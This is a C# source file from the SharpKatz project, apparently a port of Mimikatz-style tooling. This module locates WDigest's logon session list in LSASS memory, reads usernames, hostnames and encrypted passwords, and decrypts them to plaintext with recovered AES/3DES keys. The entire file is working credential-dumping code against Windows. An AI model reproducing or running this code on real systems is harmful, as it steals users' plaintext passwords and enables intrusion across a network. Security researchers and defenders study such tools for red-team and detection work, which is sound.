//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class WDigest
    {

        static long max_search_size = 200000;

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_WDIGEST_LIST_ENTRY
        {
            public IntPtr Flink; //KIWI_WDIGEST_LIST_ENTRY
            public IntPtr Blink; //KIWI_WDIGEST_LIST_ENTRY
            public int UsageCount;
            public IntPtr This;  //KIWI_WDIGEST_LIST_ENTRY
            public LUID LocallyUniqueIdentifier;

            public UNICODE_STRING UserName; // 0x30
            public UNICODE_STRING Domaine;  // 0x40
            public UNICODE_STRING Password; // 0x50
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WDIGEST_CREDENTIALS
        {
            public byte Reserverd1;
            public byte Reserverd2;
            public byte Version;
            public byte NumberOfHashes;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 12)]
            public byte[] Reserverd3;
            public IntPtr Hash;
        }

        // Hunts through wdigest and extracts credentials to be decrypted
        public static int FindCredentials(IntPtr hLsass, IntPtr wdigestMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {

            KIWI_WDIGEST_LIST_ENTRY entry;
            IntPtr logSessListAddr;
            IntPtr llCurrent;
            string passDecrypted = "";

            logSessListAddr = Utility.GetListAdress(hLsass, wdigestMem, "wdigest.dll", max_search_size, -4, oshelper.logSessListSig);

            //Console.WriteLine("[*] l_LogSessList found at address {0:X}", logSessListAddr.ToInt64());

            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, logSessListAddr, Marshal.SizeOf(typeof(KIWI_WDIGEST_LIST_ENTRY)));
            IntPtr pThis = new IntPtr(BitConverter.ToInt64(entryBytes, Utility.FieldOffset<KIWI_WDIGEST_LIST_ENTRY>("This")));

            llCurrent = pThis;

            do
            {
                entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Marshal.SizeOf(typeof(KIWI_WDIGEST_LIST_ENTRY)));
                entry = Utility.ReadStruct<KIWI_WDIGEST_LIST_ENTRY>(entryBytes);

                if (entry.UsageCount == 1)
                {
                    IntPtr pUsername = IntPtr.Add(llCurrent, oshelper.USERNAME_OFFSET);
                    IntPtr pHostname = IntPtr.Add(llCurrent, oshelper.HOSTNAME_OFFSET);
                    IntPtr pPassword = IntPtr.Add(llCurrent, oshelper.PASSWORD_OFFSET);

                    string username = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pUsername));
                    string hostname = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pHostname));
                    string password = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pPassword));

                    if (!string.IsNullOrEmpty(username) && username.Length > 1 )
                    {
                        LUID luid = entry.LocallyUniqueIdentifier;

                        Credential.WDigest wdigestentry = new Credential.WDigest();
                        wdigestentry.UserName = username;

                        if (!string.IsNullOrEmpty(hostname))
                        {
                            wdigestentry.HostName = hostname;
                        }
                        else
                        {
                            wdigestentry.HostName = "[NULL]";
                        }

                        // Check if password is present
                        if (!string.IsNullOrEmpty(password) && (password.Length % 2) == 0)
                        {

                            // Decrypt password using recovered AES/3Des keys and IV
                            passDecrypted = Encoding.Unicode.GetString(BCrypt.DecryptCredentials(Encoding.Unicode.GetBytes(password), iv, aeskey, deskey));
                            if (passDecrypted.Length > 0)
                            {
                                wdigestentry.Password = passDecrypted;
                            }

                        }
                        else
                        {
                            wdigestentry.Password = "[NULL]";
                        }

                        Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                        if (currentlogon == null)
                        {
                            currentlogon = new Logon(luid)
                            {
                                UserName = username,
                                Wdigest = wdigestentry
                            };
                            logonlist.Add(currentlogon);
                        }
                        else
                        {
                            currentlogon.Wdigest = wdigestentry;
                        }
                    }
                }

                llCurrent = entry.Flink;
            } while (llCurrent != logSessListAddr);

            return 0;
        }
    }
}
